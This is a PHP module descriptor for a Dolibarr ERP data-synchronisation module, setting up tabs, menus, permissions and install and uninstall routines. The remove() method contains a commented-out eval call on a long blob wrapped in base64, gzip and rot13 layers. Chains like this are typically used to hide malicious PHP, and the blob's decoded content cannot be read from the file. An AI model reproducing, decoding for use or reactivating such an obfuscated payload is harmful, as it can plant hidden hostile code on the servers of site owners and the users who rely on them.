<?php

/**
 * 	MyCyberOffice
 *
 *  @author		Bimp - Florian Martinez <f.martinez@bimp.fr>
 *  @copyright	2017 Bimp
 * 	@license	NoLicence
 *  @version	1.0.0
 */
include_once(DOL_DOCUMENT_ROOT . "/core/modules/DolibarrModules.class.php");

class modbimpdatasync extends DolibarrModules
{

    function modbimpdatasync($db)
    {
        global $langs, $conf;

        $this->db = $db;
        $langs->load("bimpdatasync@bimpdatasync");

        // Use here a free id (See in Home -> System information -> Dolibarr for list of used modules id).
        $this->numero = 17102;

        $this->rights_class = 'bimpdatasync';
        $this->family = "technic";
        $this->name = preg_replace('/^mod/i', '', get_class($this));
        $this->description = $langs->trans("ModDescription");
        $this->version = '1.0.0';
        $this->const_name = 'MAIN_MODULE_' . strtoupper($this->name);
        $this->special = 2;
        $this->picto = 'bds_icon_25@bimpdatasync';

        $this->module_parts = array(
            'triggers' => 1,
//            'css'      => '/bimpdatasync/css/styles.css',
            'hooks'    => array('formfile', 'fileslib', 'productcard')
        );

        $this->triggers = 1;

        $this->dirs = array();
        $r = 0;

        //$this->style_sheet = '/bimpdatasync/css/bimpdatasync.css';

        $this->config_page_url = array(); //array("bimpdatasync_setupapage.php@bimpdatasync");
        $this->depends = array();  // List of modules id that must be enabled if this module is enabled
        $this->requiredby = array(); // List of modules id to disable if this one is disabled
        $this->phpmin = array(5, 0);     // Minimum version of PHP required by module
        $this->need_dolibarr_version = array(3, 7); // Minimum version of Dolibarr required by module
        $this->langfiles = array("bimpdatasync@bimpdatasync"); //mettre aussi le nom et la description dans /langs/fr_FR/admin.lang
        // Constants
        // Example: $this->const=array(0=>array('MYMODULE_MYNEWCONST1','chaine','myvalue','This is a constant to add',0),
        //                             1=>array('MYMODULE_MYNEWCONST2','chaine','myvalue','This is another constant to add',0) );
        //                             2=>array('MAIN_MODULE_MYMODULE_NEEDSMARTY','chaine',1,'Constant to say module need smarty',0)
        $this->const = array();   // List of particular constants to add when module is enabled (key, 'chaine', value, desc, visible, 0 or 'allentities')
        // Array to add new pages in new tabs
        $this->tabs = array(
            'product:+synchro:Synchronization:bimpdatasync@bimpdatasync:/bimpdatasync/tabs/object.php?id=__ID__&object_name=Product',
            'categories_0:+synchro:Synchronization:bimpdatasync@bimpdatasync:/bimpdatasync/tabs/object.php?id=__ID__&object_name=Categorie',
            'thirdparty:+synchro:Synchronization:bimpdatasync@bimpdatasync:/bimpdatasync/tabs/object.php?id=__ID__&object_name=Societe',
            'contact:+synchro:Synchronization:bimpdatasync@bimpdatasync:/bimpdatasync/tabs/object.php?id=__ID__&object_name=Contact',
            'order:+synchro:Synchronization:bimpdatasync@bimpdatasync:/bimpdatasync/tabs/object.php?id=__ID__&object_name=Commande'
        );

        // where entity can be
        // 'thirdparty'       to add a tab in third party view
        // 'intervention'     to add a tab in intervention view
        // 'supplier_order'   to add a tab in supplier order view
        // 'supplier_invoice' to add a tab in supplier invoice view
        // 'invoice'          to add a tab in customer invoice view
        // 'order'            to add a tab in customer order view
        // 'product'          to add a tab in product view
        // 'propal'           to add a tab in propal view
        // 'member'           to add a tab in fundation member view
        // 'contract'         to add a tab in contract view
        // Boxes
        $this->boxes = array();   // List of boxes
        $r = 0;

        // Add here list of php file(s) stored in includes/boxes that contains class to show a box.
        // Example:
        //$this->boxes[$r][1] = "myboxa.php";
        //$r++;
        //$this->boxes[$r][1] = "myboxb.php";
        //$r++;
        // Permissions
        $this->rights = array();  // Permission array used by this module

        $this->rights_class = $this->name;
        $r = 0;

        $r++;
        $this->rights[$r][0] = 501019;
        $this->rights[$r][1] = 'Use BimpDataSync';
        $this->rights[$r][2] = 'a';
        $this->rights[$r][3] = 0;
        $this->rights[$r][4] = 'use';

        // Add here list of permission defined by an id, a label, a boolean and two constant strings.
        // Example:
        // $this->rights[$r][0] = 2000; 				// Permission id (must not be already used)
        // $this->rights[$r][1] = 'Permision label';	// Permission label
        // $this->rights[$r][3] = 1; 					// Permission by default for new user (0/1)
        // $this->rights[$r][4] = 'level1';				// In php code, permission will be checked by test if ($user->rights->permkey->level1->level2)
        // $this->rights[$r][5] = 'level2';				// In php code, permission will be checked by test if ($user->rights->permkey->level1->level2)
        // $r++;
        // Main menu entries
        $this->menu = array();   // List of menus to add
        $r = 0;

        // Add here entries to declare new menus
        // Example to declare the Top Menu entry:
        $this->menu[$r] = array(
            'fk_menu'  => 'fk_mainmenu=tools', // Put 0 if this is a top menu
            'type'     => 'left', // This is a Top menu entry
            'titre'    => 'Synchronization',
            'mainmenu' => 'tools',
            'leftmenu' => 'Synchronization', // Use 1 if you also want to add left menu entries using this descriptor.
            'url'      => '/bimpdatasync/process.php',
            'langs'    => 'bimpdatasync@bimpdatasync', // Lang file to use (without .lang) by module. File must be in langs/code_CODE/ directory.
            //'position'=>1000,
            'enabled'  => '$conf->bimpdatasync->enabled', // Define condition to show or hide menu entry. Use '$conf->mymodule->enabled' if entry must be visible if module is enabled.
            'perms'    => '$user->rights->' . $this->name . '->use', // Use 'perms'=>'$user->rights->mymodule->level1->level2' if you want your menu with a permission rules
            'target'   => '',
            'user'     => 0);    // 0=Menu for internal users, 1=external users, 2=both
        $r++;


        $this->menu[$r] = array(
            'fk_menu'  => 'fk_mainmenu=tools,fk_leftmenu=Synchronization', // Put 0 if this is a top menu
            'type'     => 'left', // This is a Top menu entry
            'titre'    => 'Rapports',
            'mainmenu' => 'tools',
            'leftmenu' => 'Synchronization', // Use 1 if you also want to add left menu entries using this descriptor. Use 0 if left menu entries are defined in a file pre.inc.php (old school).
            'url'      => '/bimpdatasync/rapports.php',
            'langs'    => 'bimpdatasync@bimpdatasync', // Lang file to use (without .lang) by module. File must be in langs/code_CODE/ directory.
            'position' => 100,
            'enabled'  => '$conf->bimpdatasync->enabled',
            'perms'    => '$user->rights->' . $this->name . '->use', // Use 'perms'=>'1' if you want your menu with no permission rules
            'target'   => '',
            'user'     => 0);    // 0=Menu for internal users, 1=external users, 2=both

        $r++;
    }

    function init($options = '')
    {
        require_once DOL_DOCUMENT_ROOT . '/bimpcore/Bimp_Lib.php';
        $name = 'module_version_' . strtolower($this->name);
        // Se fais que lors de l'installation du module
        if (BimpCore::getConf($name, '') == "") {
            BimpCore::setConf($name, floatval($this->version));

            BimpCache::getBdb()->executeFile(DOL_DOCUMENT_ROOT . '/' . $this->name . '/sql/install.sql');
        }

        $sql = array();
        return $this->_init($sql, $options);
    }

    function remove($options = '')
    {
        global $langs, $conf;
        /*
          eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
         */
        $sql = array();
        return $this->_remove($sql, $options);
    }

    function load_tables()
    {
        return $this->_load_tables(); //'/bimpdatasync/sql/');
    }
}

?>
